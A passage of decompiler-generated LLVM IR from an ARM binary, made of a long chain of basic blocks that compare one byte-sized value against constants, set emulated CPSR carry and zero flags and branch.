  %v7_ef80 = icmp eq i32 %v1_e870, 252
  store i1 %v7_ef80, i1* %cpsr_z.global-to-local, align 1
  %v2_ef84 = xor i1 %v2_ef80, true
  %v3_ef84 = or i1 %v7_ef80, %v2_ef84
  br i1 %v3_ef84, label %dec_label_pc_e858, label %dec_label_pc_ef88

dec_label_pc_ef88:                                ; preds = %.thread175, %dec_label_pc_ef80, %bb1523
  %v0_ef94.pr855 = phi i32 [ 0, %.thread175 ], [ 1, %dec_label_pc_ef80 ], [ 0, %bb1523 ]
  %v2_ef88 = icmp ugt i32 %v1_e870, 163
  store i1 %v2_ef88, i1* %cpsr_c.global-to-local, align 1
  %v7_ef88 = icmp eq i32 %v1_e870, 164
  store i1 %v7_ef88, i1* %cpsr_z.global-to-local, align 1
  %v2_ef8c = xor i1 %v2_ef88, true
  %v3_ef8c = or i1 %v7_ef88, %v2_ef8c
  br i1 %v3_ef8c, label %bb1524, label %bb1525

bb1524:                                           ; preds = %dec_label_pc_ef88
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1525

bb1525:                                           ; preds = %dec_label_pc_ef88, %bb1524
  %v0_ef94.pr = phi i32 [ %v0_ef94.pr855, %dec_label_pc_ef88 ], [ 0, %bb1524 ]
  %v2_ef90 = xor i1 %v7_ef88, true
  %v3_ef90 = and i1 %v2_ef88, %v2_ef90
  br i1 %v3_ef90, label %bb1526, label %thread-pre-split178

bb1526:                                           ; preds = %bb1525
  store i32 %.1976, i32* %r3.global-to-local, align 4
  br label %thread-pre-split178

thread-pre-split178:                              ; preds = %bb1525, %bb1526
  %v0_ef94 = phi i32 [ %.1976, %bb1526 ], [ %v0_ef94.pr, %bb1525 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef94 = icmp eq i32 %v0_ef94, 0
  store i1 %v2_ef94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef94, label %dec_label_pc_efa4, label %dec_label_pc_ef9c

dec_label_pc_ef9c:                                ; preds = %thread-pre-split178
  %v2_ef9c = icmp ugt i32 %v1_e870, 164
  store i1 %v2_ef9c, i1* %cpsr_c.global-to-local, align 1
  %v7_ef9c = icmp eq i32 %v1_e870, 165
  store i1 %v7_ef9c, i1* %cpsr_z.global-to-local, align 1
  %v2_efa0 = xor i1 %v2_ef9c, true
  %v3_efa0 = or i1 %v7_ef9c, %v2_efa0
  br i1 %v3_efa0, label %dec_label_pc_e858, label %dec_label_pc_efa4

dec_label_pc_efa4:                                ; preds = %dec_label_pc_ef9c, %thread-pre-split178
  %v2_efa8 = and i32 %v0_edb8, %.1980
  %v4_efa8 = icmp eq i32 %v2_efa8, 0
  store i1 %v4_efa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_efa8, label %dec_label_pc_efb8, label %dec_label_pc_efb0

dec_label_pc_efb0:                                ; preds = %dec_label_pc_efa4
  %v2_efb0 = icmp ugt i32 %v1_e870, 41
  store i1 %v2_efb0, i1* %cpsr_c.global-to-local, align 1
  %v7_efb0 = icmp eq i32 %v1_e870, 42
  store i1 %v7_efb0, i1* %cpsr_z.global-to-local, align 1
  %v2_efb4 = xor i1 %v2_efb0, true
  %v3_efb4 = or i1 %v7_efb0, %v2_efb4
  br i1 %v3_efb4, label %dec_label_pc_e858, label %dec_label_pc_efb8

dec_label_pc_efb8:                                ; preds = %dec_label_pc_efb0, %dec_label_pc_efa4
  store i1 %v2_ebc4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ebc4, i1* %cpsr_z.global-to-local, align 1
  %v2_efbc = xor i1 %v2_ebc4, true
  %v3_efbc = or i1 %v7_ebc4, %v2_efbc
  br i1 %v3_efbc, label %bb1527, label %bb1528

bb1527:                                           ; preds = %dec_label_pc_efb8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1528

bb1528:                                           ; preds = %dec_label_pc_efb8, %bb1527
  %v1_efc4858 = phi i32 [ %v0_ef94, %dec_label_pc_efb8 ], [ 0, %bb1527 ]
  %v2_efc0 = xor i1 %v7_ebc4, true
  %v3_efc0 = and i1 %v2_ebc4, %v2_efc0
  br i1 %v3_efc0, label %bb1529, label %bb1530

bb1529:                                           ; preds = %bb1528
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1530

bb1530:                                           ; preds = %bb1528, %bb1529
  %v1_efc4 = phi i32 [ %v1_efc4858, %bb1528 ], [ 1, %bb1529 ]
  %v2_efc4 = and i32 %v1_efc4, %.1980
  %v4_efc4 = icmp eq i32 %v2_efc4, 0
  store i1 %v4_efc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_efc4, label %dec_label_pc_efd8, label %dec_label_pc_efd0

dec_label_pc_efd0:                                ; preds = %bb1530
  %v2_efd0 = icmp ugt i32 %v1_e870, 103
  store i1 %v2_efd0, i1* %cpsr_c.global-to-local, align 1
  %v7_efd0 = icmp eq i32 %v1_e870, 104
  store i1 %v7_efd0, i1* %cpsr_z.global-to-local, align 1
  %v2_efd4 = xor i1 %v2_efd0, true
  %v3_efd4 = or i1 %v7_efd0, %v2_efd4
  br i1 %v3_efd4, label %dec_label_pc_e858, label %dec_label_pc_efd8

dec_label_pc_efd8:                                ; preds = %dec_label_pc_efd0, %bb1530
  %v2_efd8 = icmp ugt i32 %v1_e870, 166
  store i1 %v2_efd8, i1* %cpsr_c.global-to-local, align 1
  %v7_efd8 = icmp eq i32 %v1_e870, 167
  store i1 %v7_efd8, i1* %cpsr_z.global-to-local, align 1
  %v2_efdc = xor i1 %v2_efd8, true
  %v3_efdc = or i1 %v7_efd8, %v2_efdc
  br i1 %v3_efdc, label %bb1531, label %bb1532

bb1531:                                           ; preds = %dec_label_pc_efd8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1532

bb1532:                                           ; preds = %dec_label_pc_efd8, %bb1531
  %v0_efe4.pr = phi i32 [ %v1_efc4, %dec_label_pc_efd8 ], [ 0, %bb1531 ]
  %v2_efe0 = xor i1 %v7_efd8, true
  %v3_efe0 = and i1 %v2_efd8, %v2_efe0
  br i1 %v3_efe0, label %bb1533, label %thread-pre-split179

bb1533:                                           ; preds = %bb1532
  store i32 %.1980, i32* %r3.global-to-local, align 4
  br label %thread-pre-split179

thread-pre-split179:                              ; preds = %bb1532, %bb1533
  %v0_efe4 = phi i32 [ %.1980, %bb1533 ], [ %v0_efe4.pr, %bb1532 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_efe4 = icmp eq i32 %v0_efe4, 0
  store i1 %v2_efe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_efe4, label %dec_label_pc_eff4, label %dec_label_pc_efec

dec_label_pc_efec:                                ; preds = %thread-pre-split179
  %v2_efec = icmp ugt i32 %v1_e870, 168
  store i1 %v2_efec, i1* %cpsr_c.global-to-local, align 1
  %v7_efec = icmp eq i32 %v1_e870, 169
  store i1 %v7_efec, i1* %cpsr_z.global-to-local, align 1
  %v2_eff0 = xor i1 %v2_efec, true
  %v3_eff0 = or i1 %v7_efec, %v2_eff0
  br i1 %v3_eff0, label %dec_label_pc_e858, label %dec_label_pc_eff4

dec_label_pc_eff4:                                ; preds = %dec_label_pc_efec, %thread-pre-split179
  %v2_eff4 = icmp ugt i32 %v1_e870, 196
  store i1 %v2_eff4, i1* %cpsr_c.global-to-local, align 1
  %v7_eff4 = icmp eq i32 %v1_e870, 197
  store i1 %v7_eff4, i1* %cpsr_z.global-to-local, align 1
  %v2_eff8 = xor i1 %v2_eff4, true
  %v3_eff8 = or i1 %v7_eff4, %v2_eff8
  br i1 %v3_eff8, label %bb1534, label %bb1535

bb1534:                                           ; preds = %dec_label_pc_eff4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1535

bb1535:                                           ; preds = %dec_label_pc_eff4, %bb1534
  %v0_f000.pr = phi i32 [ %v0_efe4, %dec_label_pc_eff4 ], [ 0, %bb1534 ]
  %v2_effc = xor i1 %v7_eff4, true
  %v3_effc = and i1 %v2_eff4, %v2_effc
  br i1 %v3_effc, label %bb1536, label %thread-pre-split180

bb1536:                                           ; preds = %bb1535
  store i32 %.1980, i32* %r3.global-to-local, align 4
  br label %thread-pre-split180

thread-pre-split180:                              ; preds = %bb1535, %bb1536
  %v0_f000 = phi i32 [ %.1980, %bb1536 ], [ %v0_f000.pr, %bb1535 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f000 = icmp eq i32 %v0_f000, 0
  store i1 %v2_f000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f000, label %dec_label_pc_f010, label %dec_label_pc_f008

dec_label_pc_f008:                                ; preds = %thread-pre-split180
  %v2_f008 = icmp ugt i32 %v1_e870, 198
  store i1 %v2_f008, i1* %cpsr_c.global-to-local, align 1
  %v7_f008 = icmp eq i32 %v1_e870, 199
  store i1 %v7_f008, i1* %cpsr_z.global-to-local, align 1
  %v2_f00c = xor i1 %v2_f008, true
  %v3_f00c = or i1 %v7_f008, %v2_f00c
  br i1 %v3_f00c, label %dec_label_pc_e858, label %dec_label_pc_f010

dec_label_pc_f010:                                ; preds = %dec_label_pc_f008, %thread-pre-split180
  %v2_f010 = icmp ugt i32 %v1_e870, 236
  store i1 %v2_f010, i1* %cpsr_c.global-to-local, align 1
  %v7_f010 = icmp eq i32 %v1_e870, 237
  store i1 %v7_f010, i1* %cpsr_z.global-to-local, align 1
  %v2_f014 = xor i1 %v2_f010, true
  %v3_f014 = or i1 %v7_f010, %v2_f014
  br i1 %v3_f014, label %bb1537, label %bb1538

bb1537:                                           ; preds = %dec_label_pc_f010
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1538

bb1538:                                           ; preds = %dec_label_pc_f010, %bb1537
  %v0_f01c.pr = phi i32 [ %v0_f000, %dec_label_pc_f010 ], [ 0, %bb1537 ]
  %v2_f018 = xor i1 %v7_f010, true
  %v3_f018 = and i1 %v2_f010, %v2_f018
  br i1 %v3_f018, label %bb1539, label %thread-pre-split181

bb1539:                                           ; preds = %bb1538
  store i32 %.1980, i32* %r3.global-to-local, align 4
  br label %thread-pre-split181

thread-pre-split181:                              ; preds = %bb1538, %bb1539
  %v0_f01c = phi i32 [ %.1980, %bb1539 ], [ %v0_f01c.pr, %bb1538 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f01c = icmp eq i32 %v0_f01c, 0
  store i1 %v2_f01c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f01c, label %dec_label_pc_f02c, label %dec_label_pc_f024

dec_label_pc_f024:                                ; preds = %thread-pre-split181
  %v2_f024 = icmp eq i32 %v1_e870, 255
  store i1 %v2_f024, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f024, label %dec_label_pc_f02c, label %dec_label_pc_e858

dec_label_pc_f02c:                                ; preds = %dec_label_pc_f024, %thread-pre-split181
  %v2_f02c = icmp ugt i32 %v1_e870, 111
  store i1 %v2_f02c, i1* %cpsr_c.global-to-local, align 1
  %v7_f02c = icmp eq i32 %v1_e870, 112
  store i1 %v7_f02c, i1* %cpsr_z.global-to-local, align 1
  %v2_f030 = xor i1 %v2_f02c, true
  %v3_f030 = or i1 %v7_f02c, %v2_f030
  br i1 %v3_f030, label %bb1540, label %bb1541

bb1540:                                           ; preds = %dec_label_pc_f02c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1541

bb1541:                                           ; preds = %dec_label_pc_f02c, %bb1540
  %v0_f038.pr = phi i32 [ %v0_f01c, %dec_label_pc_f02c ], [ 0, %bb1540 ]
  %v2_f034 = xor i1 %v7_f02c, true
  %v3_f034 = and i1 %v2_f02c, %v2_f034
  br i1 %v3_f034, label %bb1542, label %thread-pre-split182

bb1542:                                           ; preds = %bb1541
  store i32 %.1982, i32* %r3.global-to-local, align 4
  br label %thread-pre-split182

thread-pre-split182:                              ; preds = %bb1541, %bb1542
  %v0_f038 = phi i32 [ %.1982, %bb1542 ], [ %v0_f038.pr, %bb1541 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f038 = icmp eq i32 %v0_f038, 0
  store i1 %v2_f038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f038, label %dec_label_pc_f048, label %dec_label_pc_f040

dec_label_pc_f040:                                ; preds = %thread-pre-split182
  store i1 %v2_e984, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e984, i1* %cpsr_z.global-to-local, align 1
  %v2_f044 = xor i1 %v2_e984, true
  %v3_f044 = or i1 %v7_e984, %v2_f044
  br i1 %v3_f044, label %dec_label_pc_e858, label %dec_label_pc_f048

dec_label_pc_f048:                                ; preds = %dec_label_pc_f040, %thread-pre-split182
  store i32 %.1985, i32* %r3.global-to-local, align 4
  %v2_f04c = icmp ugt i32 %v1_e870, 149
  store i1 %v2_f04c, i1* %cpsr_c.global-to-local, align 1
  %v7_f04c = icmp eq i32 %v1_e870, 150
  store i1 %v7_f04c, i1* %cpsr_z.global-to-local, align 1
  %v2_f050 = xor i1 %v2_f04c, true
  %v3_f050 = or i1 %v7_f04c, %v2_f050
  br i1 %v3_f050, label %bb1543, label %bb1544

bb1543:                                           ; preds = %dec_label_pc_f048
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1544

bb1544:                                           ; preds = %dec_label_pc_f048, %bb1543
  %v4_f054 = phi i32 [ %.1985, %dec_label_pc_f048 ], [ 0, %bb1543 ]
  %v2_f054 = xor i1 %v7_f04c, true
  %v3_f054 = and i1 %v2_f04c, %v2_f054
  br i1 %v3_f054, label %bb1545, label %thread-pre-split183

bb1545:                                           ; preds = %bb1544
  store i32 %v4_f054, i32* %r3.global-to-local, align 4
  br label %thread-pre-split183

thread-pre-split183:                              ; preds = %bb1544, %bb1545
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f058 = icmp eq i32 %v4_f054, 0
  store i1 %v2_f058, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f058, label %dec_label_pc_f068, label %dec_label_pc_f060

dec_label_pc_f060:                                ; preds = %thread-pre-split183
  store i1 %v2_e958, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e958, i1* %cpsr_z.global-to-local, align 1
  %v2_f064 = xor i1 %v2_e958, true
  %v3_f064 = or i1 %v7_e958, %v2_f064
  br i1 %v3_f064, label %dec_label_pc_e858, label %dec_label_pc_f068

dec_label_pc_f068:                                ; preds = %dec_label_pc_f060, %thread-pre-split183
  %v7_f068 = icmp eq i32 %v1_e85c, 153
  %.2011 = zext i1 %v7_f068 to i32
  store i32 %.2011, i32* %r3.global-to-local, align 4
  %v2_f074 = icmp ugt i32 %v1_e870, 19
  store i1 %v2_f074, i1* %cpsr_c.global-to-local, align 1
  %v7_f074 = icmp eq i32 %v1_e870, 20
  store i1 %v7_f074, i1* %cpsr_z.global-to-local, align 1
  %v2_f078 = xor i1 %v2_f074, true
  %v3_f078 = or i1 %v7_f074, %v2_f078
  br i1 %v3_f078, label %.thread186, label %bb1548

.thread186:                                       ; preds = %dec_label_pc_f068
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f08c

bb1548:                                           ; preds = %dec_label_pc_f068
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f07c = icmp eq i1 %v7_f068, false
  store i1 %v2_f07c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f07c, label %dec_label_pc_f08c, label %dec_label_pc_f084

dec_label_pc_f084:                                ; preds = %bb1548
  %v2_f084 = icmp ugt i32 %v1_e870, 30
  store i1 %v2_f084, i1* %cpsr_c.global-to-local, align 1
  %v7_f084 = icmp eq i32 %v1_e870, 31
  store i1 %v7_f084, i1* %cpsr_z.global-to-local, align 1
  %v2_f088 = xor i1 %v2_f084, true
  %v3_f088 = or i1 %v7_f084, %v2_f088
  br i1 %v3_f088, label %dec_label_pc_e858, label %dec_label_pc_f08c

dec_label_pc_f08c:                                ; preds = %.thread186, %dec_label_pc_f084, %bb1548
  store i32 %.1989, i32* %r4.global-to-local, align 4
  %v2_f090 = and i32 %v1_f090, %.1989
  %v4_f090 = icmp eq i32 %v2_f090, 0
  store i1 %v4_f090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f090, label %dec_label_pc_f0a0, label %dec_label_pc_f098

dec_label_pc_f098:                                ; preds = %dec_label_pc_f08c
  %v2_f098 = icmp ugt i32 %v1_e870, 8
  store i1 %v2_f098, i1* %cpsr_c.global-to-local, align 1
  %v7_f098 = icmp eq i32 %v1_e870, 9
  store i1 %v7_f098, i1* %cpsr_z.global-to-local, align 1
  %v2_f09c = xor i1 %v2_f098, true
  %v3_f09c = or i1 %v7_f098, %v2_f09c
  br i1 %v3_f09c, label %dec_label_pc_e858, label %dec_label_pc_f0a0

dec_label_pc_f0a0:                                ; preds = %dec_label_pc_f098, %dec_label_pc_f08c
  store i32 %.1989, i32* %r3.global-to-local, align 4
  %v2_f0a4 = icmp ugt i32 %v1_e870, 72
  store i1 %v2_f0a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f0a4 = icmp eq i32 %v1_e870, 73
  store i1 %v7_f0a4, i1* %cpsr_z.global-to-local, align 1
  %v2_f0a8 = xor i1 %v2_f0a4, true
  %v3_f0a8 = or i1 %v7_f0a4, %v2_f0a8
  br i1 %v3_f0a8, label %bb1549, label %bb1550

bb1549:                                           ; preds = %dec_label_pc_f0a0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1550

bb1550:                                           ; preds = %dec_label_pc_f0a0, %bb1549
  %v4_f0ac = phi i32 [ %.1989, %dec_label_pc_f0a0 ], [ 0, %bb1549 ]
  %v2_f0ac = xor i1 %v7_f0a4, true
  %v3_f0ac = and i1 %v2_f0a4, %v2_f0ac
  br i1 %v3_f0ac, label %bb1551, label %thread-pre-split189

bb1551:                                           ; preds = %bb1550
  store i32 %v4_f0ac, i32* %r3.global-to-local, align 4
  br label %thread-pre-split189

thread-pre-split189:                              ; preds = %bb1550, %bb1551
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f0b0 = icmp eq i32 %v4_f0ac, 0
  store i1 %v2_f0b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0b0, label %dec_label_pc_f0c0, label %dec_label_pc_f0b8

dec_label_pc_f0b8:                                ; preds = %thread-pre-split189
  %v2_f0b8 = icmp ugt i32 %v1_e870, 87
  store i1 %v2_f0b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f0b8 = icmp eq i32 %v1_e870, 88
  store i1 %v7_f0b8, i1* %cpsr_z.global-to-local, align 1
  %v2_f0bc = xor i1 %v2_f0b8, true
  %v3_f0bc = or i1 %v7_f0b8, %v2_f0bc
  br i1 %v3_f0bc, label %dec_label_pc_e858, label %dec_label_pc_f0c0

dec_label_pc_f0c0:                                ; preds = %dec_label_pc_f0b8, %thread-pre-split189
  store i32 %.1989, i32* %r3.global-to-local, align 4
  %v2_f0c4 = icmp ugt i32 %v1_e870, 211
  store i1 %v2_f0c4, i1* %cpsr_c.global-to-local, align 1
  %v7_f0c4 = icmp eq i32 %v1_e870, 212
  store i1 %v7_f0c4, i1* %cpsr_z.global-to-local, align 1
  %v2_f0c8 = xor i1 %v2_f0c4, true
  %v3_f0c8 = or i1 %v7_f0c4, %v2_f0c8
  br i1 %v3_f0c8, label %bb1552, label %bb1553

bb1552:                                           ; preds = %dec_label_pc_f0c0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1553

bb1553:                                           ; preds = %dec_label_pc_f0c0, %bb1552
  %v4_f0cc = phi i32 [ %.1989, %dec_label_pc_f0c0 ], [ 0, %bb1552 ]
  %v2_f0cc = xor i1 %v7_f0c4, true
  %v3_f0cc = and i1 %v2_f0c4, %v2_f0cc
  br i1 %v3_f0cc, label %bb1554, label %thread-pre-split190

bb1554:                                           ; preds = %bb1553
  store i32 %v4_f0cc, i32* %r3.global-to-local, align 4
  br label %thread-pre-split190

thread-pre-split190:                              ; preds = %bb1553, %bb1554
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f0d0 = icmp eq i32 %v4_f0cc, 0
  store i1 %v2_f0d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0d0, label %dec_label_pc_f0e0, label %dec_label_pc_f0d8

dec_label_pc_f0d8:                                ; preds = %thread-pre-split190
  %v2_f0d8 = icmp ugt i32 %v1_e870, 220
  store i1 %v2_f0d8, i1* %cpsr_c.global-to-local, align 1
  %v7_f0d8 = icmp eq i32 %v1_e870, 221
  store i1 %v7_f0d8, i1* %cpsr_z.global-to-local, align 1
  %v2_f0dc = xor i1 %v2_f0d8, true
  %v3_f0dc = or i1 %v7_f0d8, %v2_f0dc
  br i1 %v3_f0dc, label %dec_label_pc_e858, label %dec_label_pc_f0e0

dec_label_pc_f0e0:                                ; preds = %dec_label_pc_f0d8, %thread-pre-split190
  store i32 %.1987, i32* %r3.global-to-local, align 4
  store i1 %v2_e9e0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e9e0, i1* %cpsr_z.global-to-local, align 1
  %v2_f0e8 = xor i1 %v2_e9e0, true
  %v3_f0e8 = or i1 %v7_e9e0, %v2_f0e8
  br i1 %v3_f0e8, label %bb1555, label %bb1556

bb1555:                                           ; preds = %dec_label_pc_f0e0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1556

bb1556:                                           ; preds = %dec_label_pc_f0e0, %bb1555
  %v4_f0ec = phi i32 [ %.1987, %dec_label_pc_f0e0 ], [ 0, %bb1555 ]
  %v2_f0ec = xor i1 %v7_e9e0, true
  %v3_f0ec = and i1 %v2_e9e0, %v2_f0ec
  br i1 %v3_f0ec, label %bb1557, label %thread-pre-split191

bb1557:                                           ; preds = %bb1556
  store i32 %v4_f0ec, i32* %r3.global-to-local, align 4
  br label %thread-pre-split191

thread-pre-split191:                              ; preds = %bb1556, %bb1557
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f0f0 = icmp eq i32 %v4_f0ec, 0
  store i1 %v2_f0f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0f0, label %dec_label_pc_f100, label %dec_label_pc_f0f8

dec_label_pc_f0f8:                                ; preds = %thread-pre-split191
  %v2_f0f8 = icmp ugt i32 %v1_e870, 152
  store i1 %v2_f0f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f0f8 = icmp eq i32 %v1_e870, 153
  store i1 %v7_f0f8, i1* %cpsr_z.global-to-local, align 1
  %v2_f0fc = xor i1 %v2_f0f8, true
  %v3_f0fc = or i1 %v7_f0f8, %v2_f0fc
  br i1 %v3_f0fc, label %dec_label_pc_e858, label %dec_label_pc_f100

dec_label_pc_f100:                                ; preds = %dec_label_pc_f0f8, %thread-pre-split191
  %v2_f104 = icmp ugt i32 %v1_e85c, 157
  store i1 %v2_f104, i1* %cpsr_c.global-to-local, align 1
  %v7_f104 = icmp eq i32 %v1_e85c, 158
  %.2012 = zext i1 %v7_f104 to i32
  store i32 %.2012, i32* %r3.global-to-local, align 4
  %v2_f110 = and i32 %v0_fed0, %.2012
  %v4_f110 = icmp eq i32 %v2_f110, 0
  store i1 %v4_f110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f110, label %dec_label_pc_f120, label %dec_label_pc_f118

dec_label_pc_f118:                                ; preds = %dec_label_pc_f100
  store i1 %v2_f074, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f074, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f078, label %dec_label_pc_e858, label %dec_label_pc_f120

dec_label_pc_f120:                                ; preds = %dec_label_pc_f118, %dec_label_pc_f100
  %v2_f120 = icmp ugt i32 %v1_e870, 233
  store i1 %v2_f120, i1* %cpsr_c.global-to-local, align 1
  %v7_f120 = icmp eq i32 %v1_e870, 234
  store i1 %v7_f120, i1* %cpsr_z.global-to-local, align 1
  %v2_f124 = xor i1 %v2_f120, true
  %v3_f124 = or i1 %v7_f120, %v2_f124
  br i1 %v3_f124, label %bb1560, label %bb1561

bb1560:                                           ; preds = %dec_label_pc_f120
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1561

bb1561:                                           ; preds = %dec_label_pc_f120, %bb1560
  %v4_f128 = phi i32 [ %.2012, %dec_label_pc_f120 ], [ 0, %bb1560 ]
  %v2_f128 = xor i1 %v7_f120, true
  %v3_f128 = and i1 %v2_f120, %v2_f128
  br i1 %v3_f128, label %bb1562, label %thread-pre-split193

bb1562:                                           ; preds = %bb1561
  store i32 %v4_f128, i32* %r3.global-to-local, align 4
  br label %thread-pre-split193

thread-pre-split193:                              ; preds = %bb1561, %bb1562
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f12c = icmp eq i32 %v4_f128, 0
  store i1 %v2_f12c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f12c, label %dec_label_pc_f13c, label %dec_label_pc_f134

dec_label_pc_f134:                                ; preds = %thread-pre-split193
  %v2_f134 = icmp ugt i32 %v1_e870, 245
  store i1 %v2_f134, i1* %cpsr_c.global-to-local, align 1
  %v7_f134 = icmp eq i32 %v1_e870, 246
  store i1 %v7_f134, i1* %cpsr_z.global-to-local, align 1
  %v2_f138 = xor i1 %v2_f134, true
  %v3_f138 = or i1 %v7_f134, %v2_f138
  br i1 %v3_f138, label %dec_label_pc_e858, label %dec_label_pc_f13c

dec_label_pc_f13c:                                ; preds = %dec_label_pc_f134, %thread-pre-split193
  %v7_f13c = icmp eq i32 %v1_e85c, 159
  %.2013 = zext i1 %v7_f13c to i32
  %v2_f148 = icmp ugt i32 %v1_e870, 118
  store i1 %v2_f148, i1* %cpsr_c.global-to-local, align 1
  %v7_f148 = icmp eq i32 %v1_e870, 119
  store i1 %v7_f148, i1* %cpsr_z.global-to-local, align 1
  %v2_f14c = xor i1 %v2_f148, true
  %v3_f14c = or i1 %v7_f148, %v2_f14c
  br i1 %v3_f14c, label %bb1565, label %bb1566

bb1565:                                           ; preds = %dec_label_pc_f13c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1566

bb1566:                                           ; preds = %dec_label_pc_f13c, %bb1565
  %v0_f154.pr = phi i32 [ %v4_f128, %dec_label_pc_f13c ], [ 0, %bb1565 ]
  %v2_f150 = xor i1 %v7_f148, true
  %v3_f150 = and i1 %v2_f148, %v2_f150
  br i1 %v3_f150, label %bb1567, label %thread-pre-split195

bb1567:                                           ; preds = %bb1566
  store i32 %.2013, i32* %r3.global-to-local, align 4
  br label %thread-pre-split195

thread-pre-split195:                              ; preds = %bb1566, %bb1567
  %v0_f154 = phi i32 [ %.2013, %bb1567 ], [ %v0_f154.pr, %bb1566 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f154 = icmp eq i32 %v0_f154, 0
  store i1 %v2_f154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f154, label %dec_label_pc_f164, label %dec_label_pc_f15c

dec_label_pc_f15c:                                ; preds = %thread-pre-split195
  store i1 %v2_ec88, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ec88, i1* %cpsr_z.global-to-local, align 1
  %v2_f160 = xor i1 %v2_ec88, true
  %v3_f160 = or i1 %v7_ec88, %v2_f160
  br i1 %v3_f160, label %dec_label_pc_e858, label %dec_label_pc_f164

dec_label_pc_f164:                                ; preds = %dec_label_pc_f15c, %thread-pre-split195
  %v7_f164 = icmp eq i32 %v1_e85c, 160
  %.2014 = zext i1 %v7_f164 to i32
  store i32 %.2014, i32* %r3.global-to-local, align 4
  %v2_f170 = icmp ugt i32 %v1_e870, 130
  store i1 %v2_f170, i1* %cpsr_c.global-to-local, align 1
  %v7_f170 = icmp eq i32 %v1_e870, 131
  store i1 %v7_f170, i1* %cpsr_z.global-to-local, align 1
  %v2_f174 = xor i1 %v2_f170, true
  %v3_f174 = or i1 %v7_f170, %v2_f174
  br i1 %v3_f174, label %.thread198, label %bb1570

.thread198:                                       ; preds = %dec_label_pc_f164
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f188

bb1570:                                           ; preds = %dec_label_pc_f164
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f178 = icmp eq i1 %v7_f164, false
  store i1 %v2_f178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f178, label %dec_label_pc_f188, label %dec_label_pc_f180

dec_label_pc_f180:                                ; preds = %bb1570
  store i1 %v2_f04c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f04c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f050, label %dec_label_pc_e858, label %dec_label_pc_f188

dec_label_pc_f188:                                ; preds = %.thread198, %dec_label_pc_f180, %bb1570
  store i32 %.2001, i32* %r3.global-to-local, align 4
  %v2_f18c = icmp ugt i32 %v1_e870, 222
  store i1 %v2_f18c, i1* %cpsr_c.global-to-local, align 1
  %v7_f18c = icmp eq i32 %v1_e870, 223
  store i1 %v7_f18c, i1* %cpsr_z.global-to-local, align 1
  %v2_f190 = xor i1 %v2_f18c, true
  %v3_f190 = or i1 %v7_f18c, %v2_f190
  br i1 %v3_f190, label %bb1571, label %bb1572

bb1571:                                           ; preds = %dec_label_pc_f188
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1572

bb1572:                                           ; preds = %dec_label_pc_f188, %bb1571
  %v4_f194 = phi i32 [ %.2001, %dec_label_pc_f188 ], [ 0, %bb1571 ]
  %v2_f194 = xor i1 %v7_f18c, true
  %v3_f194 = and i1 %v2_f18c, %v2_f194
  br i1 %v3_f194, label %bb1573, label %thread-pre-split201
